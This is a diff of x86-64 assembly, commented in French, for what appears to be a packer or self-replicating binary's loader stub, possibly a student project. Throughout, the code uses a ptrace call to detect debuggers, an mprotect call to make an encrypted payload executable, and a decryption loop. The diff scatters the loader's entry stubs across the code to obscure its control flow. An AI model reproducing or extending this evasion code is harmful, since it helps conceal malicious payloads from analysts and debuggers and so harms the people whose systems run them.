@@ -3,18 +3,6 @@ global loader
 global ft_end
 
 loader:
-push DWORD 1 ; entree
-jmp common_loader ; entree
-push DWORD 2 ; entree
-jmp common_loader ; entree
-push DWORD 3 ; entree
-jmp common_loader ; entree
-push DWORD 4 ; entree
-jmp common_loader ; entree
-push DWORD 5 ; entree
-jmp common_loader ; entree
-
-common_loader:
     push rbp ; push
     mov rbp, rsp ; push
 	and rsp, 0xFFFFFFFFFFFFFFF0 ; push
@@ -38,14 +26,26 @@ syscalls:
 	mov rdx, 1 ; syscalls
 	mov r10, 0 ; syscalls
 	mov rax, 0x65 ; syscalls
+;
+	jmp after_entry_1
+	push DWORD 1 ; entree
+	jmp loader ; entree
+after_entry_1:
+;
 	syscall ; syscalls
 	cmp eax, 0 ; syscalls
-	jg 0xB5 ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
+	jg end_ft_end ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
     mov rdx, 0x7 ;EXEC | READ ; syscalls
-    mov rsi, 0x2847;|REPLACE1| size payload + 1 page ; syscalls
+    mov rsi, 0x2883;|REPLACE1| size payload + 1 page ; syscalls
 	lea rdi, [$ + 0x10000000] ; adresse du payload ; syscalls
 	mov rbx, rdi ; syscalls
 	and rdi, 0xFFFFFFFFFFFFF000 ; syscalls
+;
+	jmp after_entry_2
+	push DWORD 2 ; entree
+	jmp loader ; entree
+after_entry_2:
+;
 	mov rax, 0xa ; syscalls
 	syscall ; syscalls
 
@@ -90,10 +90,22 @@ ft_end:
 mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x1847;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x1883;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 	shl eax, 2 ; dechiffrement & chiffrement
 	mov ecx, eax ; dechiffrement & chiffrement
+;
+	jmp after_entry_4
+	push DWORD 4 ; entree
+;
+	jmp after_entry_5
+	push DWORD 5 ; entree
+	jmp loader ; entree
+after_entry_5:
+;
+	jmp loader ; entree
+after_entry_4:
+;
 	sub ecx, DWORD 4 ; dechiffrement & chiffrement
 	mov rdi, rbx ; debut du payload ; dechiffrement & chiffrement
 	cmp r13, 1 ; cmp to get back in loader if necessary ; dechiffrement & chiffrement
@@ -129,6 +141,12 @@ end_ft_end:
 	pop r11 ; pop
 	pop r10 ; pop
 	pop r9 ; pop
+;
+	jmp after_entry_3
+	push DWORD 3 ; entree
+	jmp loader ; entree
+after_entry_3:
+;
 	pop r8 ; pop
 	pop rdx ; pop
 	pop rcx ; pop
